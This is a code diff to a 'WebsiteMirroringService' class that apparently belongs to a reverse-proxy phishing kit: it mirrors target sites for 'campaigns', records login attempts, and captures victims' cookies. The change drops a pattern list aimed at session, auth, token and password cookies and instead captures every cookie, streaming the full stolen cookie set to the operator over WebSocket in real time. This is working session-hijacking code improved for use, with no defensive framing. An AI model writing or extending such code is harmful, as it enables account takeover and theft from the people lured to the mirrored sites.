@@ -1210,7 +1210,7 @@ class WebsiteMirroringService {
         });
         
         // Track interesting cookies (like auth tokens)
-        this.trackInterestingCookies(session.sessionToken, cookies);
+        this.trackAllCookies(sessionToken, cookies);
         
         // If we have a login attempt ID, update it with cookies
         if (loginAttemptId) {
@@ -1436,14 +1436,10 @@ class WebsiteMirroringService {
   }
 
   /**
-   * Track potentially interesting cookies like auth tokens
+   * Track all cookies (previously only tracked "interesting" ones)
+   * Now captures every cookie to get complete session state
    */
-  trackInterestingCookies(sessionToken, cookies) {
-    const interestingPatterns = [
-      /sess/i, /auth/i, /token/i, /sid/i, /session/i, /login/i, /user/i, /pass/i,
-      /account/i, /secure/i, /remember/i, /csrf/i, /xsrf/i
-    ];
-    
+  trackAllCookies(sessionToken, cookies) {
     const captures = this.captures.get(sessionToken);
     if (!captures) {
       console.error(`No captures found for session ${sessionToken}`);
@@ -1462,13 +1458,32 @@ class WebsiteMirroringService {
         // Parse the cookie string to extract all attributes
         const cookieDetails = this.parseCookieString(cookie);
         
-        // Check if this cookie matches any interesting patterns
-        if (interestingPatterns.some(pattern => pattern.test(cookieDetails.name))) {
-          // Add the cookie to captures
+        // Skip cookies with empty names or values
+        if (!cookieDetails.name || cookieDetails.value === undefined) {
+          return;
+        }
+        
+        // Check if we already have this cookie (update existing or add new)
+        const existingIndex = captures.cookies.findIndex(c => 
+          c.name === cookieDetails.name && 
+          c.domain === cookieDetails.domain &&
+          c.path === cookieDetails.path
+        );
+        
+        if (existingIndex !== -1) {
+          // Update existing cookie
+          captures.cookies[existingIndex] = {
+            ...captures.cookies[existingIndex],
+            ...cookieDetails,
+            lastUpdated: new Date().toISOString()
+          };
+          console.log(`🔄 Updated cookie: ${cookieDetails.name}`);
+        } else {
+          // Add new cookie
+          cookieDetails.firstSeen = new Date().toISOString();
           captures.cookies.push(cookieDetails);
           newCookies.push(cookieDetails);
-          
-          console.log(`⚠️ Captured interesting cookie: ${cookieDetails.name}`);
+          console.log(`📥 Captured new cookie: ${cookieDetails.name}`);
         }
       } catch (error) {
         console.error(`Error processing cookie: ${error.message}`);
@@ -1477,18 +1492,19 @@ class WebsiteMirroringService {
     
     this.captures.set(sessionToken, captures);
     
-    // Emit real-time cookie updates via WebSocket if we have new cookies
-    if (newCookies.length > 0 && this.io && session) {
+    // Emit real-time cookie updates via WebSocket if we have new or updated cookies
+    if ((newCookies.length > 0 || cookies.length > 0) && this.io && session) {
       const cookieUpdateData = {
         campaignId: session.campaignId,
         sessionToken: sessionToken,
-        cookies: newCookies,
+        newCookies: newCookies,
+        allCookies: captures.cookies,
         totalCookies: captures.cookies.length,
         timestamp: new Date().toISOString(),
         url: session.targetUrl
       };
       
-      console.log(`🔄 Emitting real-time cookie update for campaign ${session.campaignId}: ${newCookies.length} new cookies`);
+      console.log(`🔄 Emitting real-time cookie update for campaign ${session.campaignId}: ${newCookies.length} new cookies, ${captures.cookies.length} total`);
       this.io.emit('cookies:captured', cookieUpdateData);
     }
   }
@@ -1739,7 +1755,7 @@ class WebsiteMirroringService {
         });
         
         // Track interesting cookies (like auth tokens)
-        this.trackInterestingCookies(sessionToken, cookies);
+        this.trackAllCookies(sessionToken, cookies);
       }
 
       // Handle redirects
